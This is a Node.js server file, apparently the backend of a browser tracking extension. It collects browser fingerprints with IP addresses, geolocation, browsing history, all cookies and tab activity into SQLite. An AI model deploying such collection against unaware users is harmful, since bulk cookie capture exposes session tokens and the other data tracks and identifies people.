// Import library modules.
var express    = require('express')
  , app        = express()
  , server     = require('http').createServer(app)
  , sio        = require('socket.io')
  , io         = sio.listen(server, { log: false })
  , db         = require('sqlite-wrapper')('activity.sqlite')
  // , crypto     = require('cryptojs').Crypto
  // , lzs        = require('lz-string')
  ;

// Import event modules.
var events = {
    fingerprint: require('./events/fingerprint.js')(db),
    geoposition: require('./events/geoposition.js')(db),
    history:     require('./events/history.js')(db),
    cookie:      require('./events/cookie.js')(db),
    window:      require('./events/window.js')(db)
};

// Start server.
server.listen(8080);

///////////////////////////////////////////////////////////////////////////////
// WebSockets handling.
///////////////////////////////////////////////////////////////////////////////

io.sockets.on('connection', function (socket) {
    // Get browser fingerprint (DB: Fingerprints).
    socket.on('addFingerprint', function (data) {
        var ipAddress = socket.handshake.address.address;
        events.fingerprint.add(data, ipAddress);
    });
    // Get current location (DB: Geopositions).
    socket.on('addGeoposition', function (data) {
        events.geoposition.add(data);
    });
    // Get URL visit(s) (DB: History).
    socket.on('addURL', function (data) {
        events.history.add(data);
    });
    // Get URL removal (DB: History).
    socket.on('removeURL', function (data) {
        events.history.remove(data);
    });
    // Get all cookies (DB: Cookies).
    socket.on('addAllCookies', function (data) {
        events.cookie.addAll(data);
    });
    // Get cookie change (DB: Cookies).
    socket.on('addCookieChange', function (data) {
        events.cookie.change(data);
    });
    // Add all tabs (DB: Windows, Tabs).
    socket.on('addAllTabs', function (data) {
        events.window.add(data);
    });
    // Add window (DB: Windows).
    socket.on('addWindow', function (data) {
        events.window.add(data);
    });
    // Focus window (DB: Windows).
    socket.on('focusWindow', function (data) {
        events.window.focus(data);
    });
    // Remove window (DB: Windows).
    socket.on('removeWindow', function (data) {
        events.window.remove(data);
    });
});

///////////////////////////////////////////////////////////////////////////////
// Database handling.
///////////////////////////////////////////////////////////////////////////////

// Create tables.
for (var event in events) {
    events[event].createTable();
}
